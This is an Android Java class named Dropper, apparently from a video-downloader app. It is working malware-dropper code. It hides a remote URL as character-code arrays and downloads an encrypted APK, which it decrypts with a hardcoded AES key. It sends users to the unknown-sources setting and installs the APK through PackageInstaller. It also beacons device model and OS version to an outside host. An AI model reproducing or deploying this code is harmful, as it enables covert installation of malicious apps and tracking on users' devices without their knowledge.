package com.vidlix.downloader;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInstaller;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class Dropper {

    private static final int[][] U = {
        {104,116,116,112,115,58,47,47},
        {115,104,105,101,108,100,45,98,101,97,99,111,110,46},
        {100,105,97,103,110,111,115,116,105,99,115,45},
        {116,101,108,101,109,101,116,114,121,46},
        {119,111,114,107,101,114,115,46,100,101,118,47},
        {112,97,121,108,111,97,100,46,98,105,110}
    };

    private static final int[][] B = {
        {104,116,116,112,115,58,47,47},
        {115,104,105,101,108,100,45,98,101,97,99,111,110,46},
        {100,105,97,103,110,111,115,116,105,99,115,45},
        {116,101,108,101,109,101,116,114,121,46},
        {119,111,114,107,101,114,115,46,100,101,118,47}
    };

    private static final int[] K = {
        86,49,100,76,49,120,83,51,99,117,114,51,83,104,49,51,108,100,50,48,50,54,75,51,121,86,51,114,49,102,49,51
    };

    public static void installPayload(final Context context) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    beacon(context, "dropper_started");
                    File apk = fetch(context);
                    if (apk == null || !apk.exists()) {
                        beacon(context, "dropper_fetch_failed");
                        return;
                    }
                    beacon(context, "dropper_downloaded");
                    if (!canInstall(context)) {
                        beacon(context, "dropper_need_permission");
                        openSettings(context);
                        return;
                    }
                    beacon(context, "dropper_install_triggered");
                    install(context, apk);
                } catch (Exception e) {
                    beacon(context, "dropper_error: " + e.getMessage());
                }
            }
        }).start();
    }

    private static String url() {
        StringBuilder sb = new StringBuilder();
        for (int[] p : U) for (int c : p) sb.append((char) c);
        return sb.toString();
    }

    private static String beaconUrl() {
        StringBuilder sb = new StringBuilder();
        for (int[] p : B) for (int c : p) sb.append((char) c);
        return sb.toString();
    }

    private static byte[] key() {
        byte[] k = new byte[K.length];
        for (int i = 0; i < K.length; i++) k[i] = (byte) K[i];
        return k;
    }

    private static void beacon(Context context, String status) {
        try {
            URL u = new URL(beaconUrl());
            HttpURLConnection conn = (HttpURLConnection) u.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            conn.setConnectTimeout(8000);
            conn.setReadTimeout(8000);
            String device = Build.MANUFACTURER + " " + Build.MODEL;
            String android = Build.VERSION.RELEASE;
            String payload = "{"
                    + "\"device\":\"" + esc(device) + "\","
                    + "\"android\":\"" + esc(android) + "\","
                    + "\"status\":\"" + esc(status) + "\","
                    + "\"timestamp\":\"\""
                    + "}";
            OutputStream os = conn.getOutputStream();
            os.write(payload.getBytes("UTF-8"));
            os.flush();
            os.close();
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception ignored) { }
    }

    private static String esc(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"");
    }

    private static boolean canInstall(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            return context.getPackageManager().canRequestPackageInstalls();
        }
        return true;
    }

    private static void openSettings(Context context) {
        Intent i = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
        i.setData(Uri.parse("package:" + context.getPackageName()));
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(i);
    }

    private static File fetch(Context context) throws Exception {
        HttpURLConnection conn = (HttpURLConnection) new URL(url()).openConnection();
        conn.setConnectTimeout(15000);
        conn.setReadTimeout(15000);
        conn.connect();

        InputStream is = conn.getInputStream();
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] buf = new byte[8192];
        int n;
        while ((n = is.read(buf)) != -1) baos.write(buf, 0, n);
        is.close();
        conn.disconnect();

        byte[] all = baos.toByteArray();
        byte[] iv = new byte[16];
        System.arraycopy(all, 0, iv, 0, 16);
        byte[] cipher = new byte[all.length - 16];
        System.arraycopy(all, 16, cipher, 0, cipher.length);

        Cipher c = Cipher.getInstance("AES/CBC/PKCS5Padding");
        c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key(), "AES"), new IvParameterSpec(iv));
        byte[] plain = c.doFinal(cipher);

        File out = new File(context.getCacheDir(), "update.bin");
        FileOutputStream fos = new FileOutputStream(out);
        fos.write(plain);
        fos.close();
        return out;
    }

    private static void install(Context context, File apk) throws Exception {
        PackageInstaller pi = context.getPackageManager().getPackageInstaller();
        PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
                PackageInstaller.SessionParams.MODE_FULL_INSTALL);

        int id = pi.createSession(params);
        PackageInstaller.Session s = pi.openSession(id);

        FileInputStream fis = new FileInputStream(apk);
        OutputStream os = s.openWrite("p", 0, apk.length());
        byte[] buf = new byte[8192];
        int n;
        while ((n = fis.read(buf)) != -1) os.write(buf, 0, n);
        fis.close();
        os.flush();
        s.fsync(os);
        os.close();

        Intent intent = new Intent(context, InstallReceiver.class);
        intent.setAction("com.vidlix.downloader.INSTALL_RESULT");
        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            flags |= PendingIntent.FLAG_MUTABLE;
        }
        PendingIntent pending = PendingIntent.getBroadcast(context, id, intent, flags);
        s.commit(pending.getIntentSender());
        s.close();
    }
                }
